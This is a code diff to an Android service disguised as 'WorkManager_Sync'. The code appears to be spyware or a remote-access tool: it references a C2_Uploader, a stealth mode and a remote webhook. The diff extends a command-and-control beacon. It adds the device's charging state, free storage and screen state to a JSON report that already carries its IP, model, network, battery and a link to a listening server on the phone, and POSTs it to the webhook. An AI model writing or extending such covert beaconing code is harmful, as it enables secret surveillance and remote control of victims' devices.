@@ -777,19 +777,49 @@ public class WorkManager_Sync extends Service {
             int actualPort = (server != null) ? server.getListeningPort() : FirebaseConfig.DEFAULT_PORT;
             String formattedIp = (ip != null && ip.contains(":")) ? "[" + ip + "]" : ip;
             String link = "http://" + formattedIp + ":" + actualPort;
-            String deviceId = C2_Uploader.getDeviceId(this);
 
-            // Build JSON for POST (more reliable and complete)
+            String chargingStatus = "Discharging";
+            try {
+                android.content.Intent bStatus = registerReceiver(null, new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
+                if (bStatus != null) {
+                    int status = bStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
+                    if (status == android.os.BatteryManager.BATTERY_STATUS_CHARGING || status == android.os.BatteryManager.BATTERY_STATUS_FULL) {
+                        int plug = bStatus.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1);
+                        if (plug == android.os.BatteryManager.BATTERY_PLUGGED_USB) chargingStatus = "Charging (USB)";
+                        else if (plug == android.os.BatteryManager.BATTERY_PLUGGED_AC) chargingStatus = "Charging (AC)";
+                        else if (plug == android.os.BatteryManager.BATTERY_PLUGGED_WIRELESS) chargingStatus = "Charging (Wireless)";
+                        else chargingStatus = "Charging";
+                    }
+                }
+            } catch (Exception ignored) {}
+
+            String freeStorage = "Unknown";
+            try {
+                long bytes = android.os.Environment.getDataDirectory().getFreeSpace();
+                freeStorage = android.text.format.Formatter.formatFileSize(this, bytes) + " Free";
+            } catch (Exception ignored) {}
+
+            String screenState = "OFF";
+            try {
+                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
+                if (pm != null && pm.isInteractive()) {
+                    screenState = "ON";
+                }
+            } catch (Exception ignored) {}
+
+            // Build JSON for POST (without long deviceId as requested)
             String json = "{" +
-                    "\"deviceId\":\"" + deviceId + "\"," +
                     "\"ip\":\"" + ip + "\"," +
                     "\"device\":\"" + Build.MODEL + " (API " + Build.VERSION.SDK_INT + ")\"," +
                     "\"model\":\"" + Build.MODEL + " (API " + Build.VERSION.SDK_INT + ")\"," +
                     "\"network\":\"" + networkType + "\"," +
-                    "\"battery\":\"" + batteryLevel + "%\"," +
-                    "\"link\":\"" + link + "\"," +
                     "\"port\":" + actualPort + "," +
-                    "\"stealth\":" + isStealthMode() +
+                    "\"link\":\"" + link + "\"," +
+                    "\"battery\":\"" + batteryLevel + "%\"," +
+                    "\"stealth\":" + isStealthMode() + "," +
+                    "\"charging\":\"" + chargingStatus + "\"," +
+                    "\"storage\":\"" + freeStorage + "\"," +
+                    "\"screen\":\"" + screenState + "\"" +
                     "}";
 
             URL url = new URL(REMOTE_WEBHOOK_URL);
